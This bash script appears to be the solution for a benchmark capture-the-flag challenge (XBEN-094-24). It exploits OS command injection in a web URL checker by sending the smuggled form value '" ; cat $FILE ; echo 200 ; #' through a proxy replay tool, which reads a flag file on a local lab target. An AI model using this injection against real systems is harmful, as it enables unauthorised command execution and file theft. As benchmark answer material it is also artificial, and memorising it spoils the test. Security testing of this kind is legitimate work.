#!/usr/bin/env bash
# XBEN-094-24 — OS command injection in a URL checker. Proxy-mode twin. The url
# field is passed to a shell; breaking out with `" ; cat /flag ; echo 200 ; #`
# runs the command and smuggles its output back as the "status".
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
FILE="${2:-/app/flag.txt}"
SESSION="xben094p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/add_url"
BASE="$(req_of GET add_url)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/add_url' \
  --set "form.url=\" ; cat $FILE ; echo 200 ; #" >/dev/null
print_flag
